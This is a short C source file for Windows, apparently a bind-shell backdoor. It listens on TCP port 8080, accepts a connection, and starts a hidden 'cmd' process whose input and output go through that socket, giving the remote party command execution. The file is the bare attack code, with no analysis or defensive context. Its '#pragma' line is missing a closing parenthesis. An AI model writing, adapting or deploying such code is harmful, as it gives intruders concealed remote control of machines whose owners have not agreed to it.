#include <winsock2.h>
#pragma comment(linker,"/ENTRY:WinMain"

int WINAPI WinMain(HINSTANCE , HINSTANCE , LPSTR ,int ){

STARTUPINFO si;
struct sockaddr_in sa;
PROCESS_INFORMATION pi;
int s;
WSADATA HWSAdata;
WSAStartup(0x101, &HWSAdata);

s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0);

sa.sin_family = AF_INET;
sa.sin_port = 0x901F; // (USHORT)htons(8080);
sa.sin_addr.s_addr= 0x00; // htonl(INADDR_ANY);

bind(s, (struct sockaddr *) &sa, 16);
listen(s, 1);
s= accept(s,(struct sockaddr *)&sa,NULL);

si.cb = sizeof(si); // 0x44;
si.wShowWindow = SW_HIDE; // 0x00
si.dwFlags = STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES; // 0x101
si.hStdInput = si.hStdOutput = si.hStdError = (void *) s;

si.lpDesktop = si.lpTitle = (char *) 0x0000;
si.lpReserved2 = NULL;

CreateProcess(NULL ,"cmd",NULL, NULL,TRUE, 0,NULL,NULL,(STARTUPINFO*)&si,&pi);
}
